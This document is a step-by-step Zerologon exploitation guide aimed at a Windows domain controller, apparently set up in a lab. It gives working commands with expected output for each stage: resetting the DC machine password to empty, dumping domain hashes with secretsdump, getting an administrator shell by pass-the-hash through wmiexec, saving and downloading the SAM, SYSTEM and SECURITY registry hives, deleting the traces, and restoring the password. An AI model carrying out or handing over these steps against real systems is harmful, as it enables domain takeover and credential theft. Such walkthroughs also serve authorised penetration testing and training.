# ZEROLOGON Instructions:

## Before you begin:

1. you need the Domain Name for the Windows Domain Controller you are attacking.
2. you need the NetBIOS Name (PC name) for the Windows Domain Controller you are attacking.
3. you need the IP address for the Windows Domain Controller you are attacking. 

**That is all!!**

## Nmap to the rescue:
### Find the DC specifically:
All domain controllers listen on port 389

```
sudo nmap -p389 -sV 192.168.1.28
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 22:25 PDT
Nmap scan report for 192.168.1.28
Host is up (0.00037s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: zerologon.learn.now, Site: Default-First-Site-Name)
MAC Address: 08:00:27:AA:C2:F6 (Oracle VirtualBox virtual NIC)
Service Info: Host: ZEROLOGON-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.45 seconds
```

## In Our Example:
1. Domain Name = ZEROLOGON
2. NetBIOS Name = ZEROLOGON-DC
3. IP address = 192.168.1.28

## change directory to the zerologon exploit folder:

```
cd ~/zerologon
```

## 1st run set_empty_pw.py to exploit the machine:

this will set the password to an empty string

python3 set_empty_pw.py \<NetBIOS-name\> \<IP-Address\>
```
python3 set_empty_pw.py ZEROLOGON-DC 192.168.1.28
```
looking for:

Success! DC should now have the empty string as its machine password.


## 2nd run secretsdump.py to dump the hashes:
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \<Domain\>/\<NETBIOS-name\>\\$@\<IP-Address\>

it is important to have \$@ in between the NetBIOS name and the IP 

```
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 ZEROLOGON/ZEROLOGON-DC\$@192.168.1.28
```

looking for:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976:::


## 3rd run wmiexec.py to get terminal on victim machine:

wmiexec.py \<Domain\>/\<user-name\>@\<IP-Address\> -hashes \<administrator-hash\>

```
wmiexec.py ZEROLOGON/Administrator@192.168.1.28 -hashes aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976
```

Looking for:

C:\\>


## Commands to run once on victim machine:
```
verify who you are logged in as:
C:\>whoami
zerologon\administrator

verify the system you are logged into:
C:\>hostname
ZEROLOGON-DC

Prep logon credentials for download:
C:\>reg save HKLM\SYSTEM system.save
The operation completed successfully.

C:\>reg save HKLM\SAM sam.save
The operation completed successfully.

C:\>reg save HKLM\SECURITY security.save
The operation completed successfully.

Download logon credentials:
C:\>get system.save
[*] Downloading C:\\system.save

C:\>get sam.save
[*] Downloading C:\\sam.save

C:\>get security.save
[*] Downloading C:\\security.save

Clean up:
C:\>del /f system.save
C:\>del /f sam.save
C:\>del /f security.save
```

## Exit out and go back to Linux terminal: 

```
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

Looking for:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976:::

## Restore the original password:
python3 reinstall_original_pw.py <NetBIOS-name> <IP-Address> <admin-hash>

```
python3 reinstall_original_pw.py ZEROLOGON-DC 192.168.1.28 aad3b435b51404eeaad3b435b51404ee:6d4a95ae230e5ce2c1dbfd780e340cbc
```
